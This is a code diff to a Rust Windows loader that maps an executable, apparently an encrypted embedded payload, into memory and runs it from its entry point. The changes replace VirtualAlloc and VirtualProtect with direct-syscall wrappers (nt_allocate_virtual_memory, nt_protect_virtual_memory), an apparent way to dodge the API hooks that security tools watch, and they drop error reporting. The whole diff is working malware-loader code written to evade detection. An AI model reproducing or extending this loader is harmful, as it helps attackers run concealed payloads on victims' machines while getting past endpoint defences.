@@ -1,19 +1,16 @@
 #[cfg(windows)]
+mod syscalls;
+#[cfg(windows)]
 use std::{mem, ptr};
-
 #[cfg(windows)]
 use winapi::shared::minwindef::{DWORD, HMODULE, LPVOID};
 #[cfg(windows)]
-use winapi::um::errhandlingapi::GetLastError;
-#[cfg(windows)]
 use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
-#[cfg(windows)]
-use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
 #[cfg(windows)]
 use winapi::um::processthreadsapi::FlushInstructionCache;
 #[cfg(windows)]
 use winapi::um::winnt::{
-    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY,
+    PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY,
     PAGE_READWRITE,
 };
 
@@ -104,7 +101,7 @@ const SECRET_KEY: &[u8] = &[
 ];
 
 #[cfg(windows)]
-const PAYLOAD: &[u8] = &[ 
+const PAYLOAD: &[u8] = &[
 ];
 
 #[cfg(windows)]
@@ -131,9 +128,15 @@ unsafe fn set_section_permissions(image_base: *mut u8, section: &ImageSectionHea
     }
     let section_start = image_base.add(section.virtual_address as usize);
     let mut old_protect = 0;
-    let result = VirtualProtect(section_start as LPVOID, section.virtual_size as usize, protect, &mut old_protect);
-    if result == 0 {
-        return Err(format!("Failed to set section protection (error: {})", GetLastError()));
+    let status = syscalls::nt_protect_virtual_memory(
+        -1isize as *mut _,
+        &mut (section_start as *mut _),
+        &mut (section.virtual_size as usize),
+        protect,
+        &mut old_protect,
+    );
+    if status != 0 {
+        return Err(format!("Failed to set section protection (error: {})", status));
     }
     Ok(())
 }
@@ -184,7 +187,7 @@ unsafe fn resolve_imports(image_base: *mut u8, nt_headers: *const ImageNtHeaders
         let dll_name = std::ffi::CStr::from_ptr(dll_name_ptr as *const i8);
         let module = LoadLibraryA(dll_name_ptr as *const i8);
         if module.is_null() {
-            return Err(format!("Failed to load DLL: {:?} (error: {})", dll_name, GetLastError()));
+            return Err(format!("Failed to load DLL: {:?}", dll_name));
         }
         let mut thunk_ref = if (*import_desc).original_first_thunk != 0 {
             image_base.add((*import_desc).original_first_thunk as usize) as *const usize
@@ -202,7 +205,7 @@ unsafe fn resolve_imports(image_base: *mut u8, nt_headers: *const ImageNtHeaders
                 GetProcAddress(module, func_name_ptr)
             };
             if func_addr.is_null() {
-                return Err(format!("Failed to import function (error: {})", GetLastError()));
+                return Err("Failed to import function".to_string());
             }
             *func_ref = func_addr as usize;
             thunk_ref = thunk_ref.add(1);
@@ -257,7 +260,7 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
     if pe_data.len() < mem::size_of::<ImageDosHeader>() {
         return Err("PE data is too small for DOS header".to_string());
     }
-    
+
     let dos_header = &*(pe_data.as_ptr() as *const ImageDosHeader);
     if dos_header.e_magic != 0x5A4D {
         return Err("Invalid PE file (MZ signature missing)".to_string());
@@ -272,7 +275,7 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
     if nt_headers.signature != 0x4550 {
         return Err("Invalid PE signature".to_string());
     }
-    
+
     if nt_headers.optional_header.magic != 0x20b {
         return Err("Loader only supports 64-bit (x64) PE files.".to_string());
     }
@@ -282,10 +285,19 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
         return Err("Invalid PE file (SizeOfImage is zero)".to_string());
     }
 
-    let image_base = VirtualAlloc(ptr::null_mut(), image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    let mut image_base: *mut std::ffi::c_void = std::ptr::null_mut();
+    let mut region_size = image_size;
+    let status = syscalls::nt_allocate_virtual_memory(
+        -1isize as *mut _,
+        &mut image_base,
+        0,
+        &mut region_size,
+        winapi::um::winnt::MEM_COMMIT | winapi::um::winnt::MEM_RESERVE,
+        PAGE_READWRITE,
+    );
 
-    if image_base.is_null() {
-        return Err(format!("Memory allocation failed (error: {})", GetLastError()));
+    if status != 0 {
+        return Err(format!("Memory allocation failed (error: {})", status));
     }
 
     let headers_size = nt_headers.optional_header.size_of_headers as usize;
@@ -312,7 +324,7 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
     process_tls_callbacks(image_base as *mut u8, nt_headers)?;
 
     let entry_point = (image_base as usize + nt_headers.optional_header.address_of_entry_point as usize) as *const ();
-    
+
     if nt_headers.optional_header.subsystem == 2 || nt_headers.optional_header.subsystem == 3 {
         let entry_fn: extern "system" fn() -> i32 = mem::transmute(entry_point);
         entry_fn();
